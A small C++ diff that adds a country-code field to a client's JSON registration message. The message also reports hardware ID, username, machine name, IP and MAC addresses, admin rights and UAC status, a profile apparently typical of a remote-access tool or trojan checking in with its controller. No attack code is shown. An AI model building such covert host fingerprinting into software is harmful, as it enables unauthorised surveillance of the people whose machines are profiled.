@@ -174,7 +174,7 @@ bool Protocol::SendRegister(const char* clientType, const char* hardwareId,
     const char* machineName, const char* osVersion, const char* osArch,
     int cpuCount, long long totalMemory, const char* username,
     const char* clientVersion, const char* ipAddress, const char* macAddress,
-    bool isAdmin, bool isUacEnabled) {
+    const char* countryCode, bool isAdmin, bool isUacEnabled) {
 
     char json[BUFFER_SIZE];
     snprintf(json, sizeof(json),
@@ -191,6 +191,7 @@ bool Protocol::SendRegister(const char* clientType, const char* hardwareId,
         "\"clientVersion\":\"%s\","
         "\"ipAddress\":\"%s\","
         "\"macAddress\":\"%s\","
+        "\"countryCode\":\"%s\","
         "\"isAdmin\":%s,"
         "\"isUacEnabled\":%s"
         "}",
@@ -205,6 +206,7 @@ bool Protocol::SendRegister(const char* clientType, const char* hardwareId,
         clientVersion,
         ipAddress,
         macAddress,
+        countryCode,
         isAdmin ? "true" : "false",
         isUacEnabled ? "true" : "false");
 
@@ -220,6 +222,7 @@ bool Protocol::SendRegister(const char* clientType, const char* hardwareId, cons
     int cpuCount = static_cast<int>(Utils::JsonGetInt(systemInfoJson, "cpuCount"));
     long long totalMemory = Utils::JsonGetInt(systemInfoJson, "totalMemory");
     std::string localIp = Utils::JsonGetString(systemInfoJson, "localIp");
+    std::string countryCode = Utils::JsonGetString(systemInfoJson, "countryCode");
     bool isAdmin = Utils::JsonGetBool(systemInfoJson, "isAdmin");
     bool isUacEnabled = Utils::JsonGetBool(systemInfoJson, "uacEnabled");
 
@@ -230,7 +233,7 @@ bool Protocol::SendRegister(const char* clientType, const char* hardwareId, cons
         machineName.c_str(), osVersion.c_str(), architecture.c_str(),
         cpuCount, totalMemory, username.c_str(),
         CLIENT_VERSION, localIp.c_str(), macAddress.c_str(),
-        isAdmin, isUacEnabled);
+        countryCode.c_str(), isAdmin, isUacEnabled);
 }
 
 bool Protocol::SendHeartbeat(long long uptimeSeconds, long long availMemory) {
